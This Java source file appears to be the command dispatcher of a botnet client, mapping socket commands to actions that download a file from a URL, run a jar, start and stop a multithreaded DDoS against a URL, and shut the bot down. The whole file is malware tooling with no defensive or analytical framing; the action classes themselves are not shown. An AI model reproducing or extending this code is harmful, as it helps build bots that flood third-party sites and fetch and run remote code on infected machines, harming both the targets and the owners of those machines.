package client;

import static botlogic.Bot.closeSocketConnection;

/**
 * Created by kubehe on 30-04-2017.
 */
public class ActionFactory {
    public Action getAction (String[] commandWithArgs) throws Exception // use next strings (eg. [1],[2], ...) in vector as arguments
    {
        if(commandWithArgs==null)
        {
            return null;
        }



        if(commandWithArgs[0].equalsIgnoreCase("TESTINOUT"))
        {
            return new TestInOutAction();
        }
        else if(commandWithArgs[0].equalsIgnoreCase("DOWNLOADFILE"))
        {
            if(commandWithArgs.length == 3)
                return new DownloadFileFromUrlAction(commandWithArgs[1], commandWithArgs[2]);
        }
        else if(commandWithArgs[0].equalsIgnoreCase("RUNJAR"))
        {
            if(commandWithArgs.length == 3)
            {
                String[] jarCommands = new String[commandWithArgs.length];
                for (int i = 1; i < commandWithArgs.length; i++)
                    jarCommands[i - 1] = commandWithArgs[i];

                return new RunJarFileAction(jarCommands);
            }
        }
        else if(commandWithArgs[0].equalsIgnoreCase("STARTDDOSURL"))
        {
            if(commandWithArgs.length == 3)
            {
            	int numOfThreads;
            	try {
            		numOfThreads = Integer.parseInt(commandWithArgs[2]);
            	} catch (Exception e) {
            		throw e;
            	}
                return new DDOSURLAction(commandWithArgs[1], numOfThreads);
            }
        }
        else if(commandWithArgs[0].equalsIgnoreCase("STOPDDOSURL"))
        {
            if(commandWithArgs.length == 1)
            {
                return new DDOSURLAction();
            }
        }
        else if(commandWithArgs[0].equalsIgnoreCase("DIE"))
        {
            closeSocketConnection();
            System.exit(0);
        }
        return null;
    }
}
